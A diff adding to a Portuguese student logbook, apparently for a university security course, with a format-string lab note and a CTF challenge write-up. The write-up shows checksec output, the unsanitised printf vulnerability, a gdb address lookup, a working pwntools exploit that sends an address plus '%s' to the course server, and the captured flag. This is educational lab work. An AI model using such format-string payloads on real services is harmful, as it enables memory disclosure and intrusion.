@@ -184,3 +184,72 @@ with open('badfile', 'wb') as f:
 ![Tarefa 3.B](/images/logbook7-tarefa3b.png)
 
 * Este processo foi ao encontro do objetivo porque, antes de alcançar o `%n` presente na *string* de formatação, foram impressos 20480 caracteres (o que corresponde a 0x5000, em hexadecimal) e, na posição da *stack* correspondente à posição do especificador `%n` na *string* de formatação, estava o endereço de memória da variável a alterar, isto é, o valor **0x080e5068** estava colocado na 64ª posição da *stack*
+
+
+# CTF 7 
+
+## Desafio 1
+
+* Ao corrermos ```checksec program```, descobrimos várias informações:
+
+```
+❯ checksec program
+  Arch:     i386-32-little
+  RELRO:    Partial RELRO
+  Stack:    Canary found
+  NX:       NX enabled
+  PIE:      No PIE (0x8048000)
+```
+* o programa está compilado para uma arquitetura de 32 bits e é *little endian*
+* o programa tem proteção de *RELRO*
+* a *stack* tem um canário
+* a *stack* não tem permissões de execução
+* as posições do binário em memória não são aleatorizadas
+
+* Com estas proteções, concluímos que não é possível realizar um ataque *buffer overflow* (porque a *stack* tem canário e não tem permissões de execução), mas é possível realizar um ataque do tipo *format string* porque as posições do binário em memória não são aleatorizadas, o que permite usar o *gdb* para analisar o programa e chegar aos endereços que precisamos
+
+* Ao analisarmos o código-fonte do *main.c* disponibilizado, verificamos que era pedido um input ao utilizador e que era impresso pela função `printf` sem ser sanitizado, o que é uma vulnerabilidade de *format string*
+
+```c	
+  scanf("%32s", &buffer);
+  printf("You gave me this: ");
+  printf(buffer);
+```
+
+* Observamos também que a *flag* fica guardada como variável global do programa, o que significa que podemos aceder ao seu conteúdo se conseguirmos ler da *stack* e encontrar o seu endereço
+
+```c
+  char flag[FLAG_BUFFER_SIZE];
+```
+
+* Esta vulnerabilidade permite escrever diretamente na *string de formatação* e assim, ler o conteúdo apontado por um endereço de memória presente na *stack*
+
+* As funcionalidades que nos permitem obter a flag são o especificador `%s`, que permite ler uma *string* de memória e imprimi-la, bem como o *gdb* que nos permite obter esse endereço de memória
+
+```c
+  gdb program
+  p &flag
+```
+![Endereço](/images/logbook7-endereco-desafio1.png)
+
+* Modificamos o exploit_example.py para escrever o endereço da *flag* em formato string e em little endian e para conter o especificador `%s` no final da *string de formatação*, de maneira a ler do endereço pretendido
+
+```python
+  #!/usr/bin/python3
+
+  from pwn import *
+
+  p = remote("ctf-fsi.fe.up.pt", 4004)
+
+  p.recvuntil(b"got:")
+  p.sendline(b"\x60\xC0\x04\x08%s")
+  p.interactive()
+```	
+* Assim obtivemos a *flag* `flag{803fe3f7ffea58b470eaaea84fd763c7}`
+
+![Endereço](/images/logbook7-flag-desafio1.png)
+
+
+# CTF 7 
+
+## Desafio 2
